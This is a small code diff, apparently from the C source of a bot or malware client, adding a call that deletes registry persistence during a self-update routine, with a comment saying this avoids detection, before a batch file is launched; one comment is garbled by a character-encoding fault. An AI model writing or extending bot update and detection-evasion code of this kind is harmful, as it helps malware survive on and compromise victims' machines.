@@ -38,6 +38,11 @@ int update_exe(char* path) {
 
     fclose(fp);
 
+    if (delete_registry_persistence() != 0) {//Delete reg to avoid being recognized as 'HIDDEN'
+        bot_log("[-] Failed to delete registry_persistence");
+        return -1;
+    }
+
     // Æô¶¯ bat ÎÄ¼þ
     SHELLEXECUTEINFOA sei = { sizeof(sei) };
     sei.lpFile = bat_path;
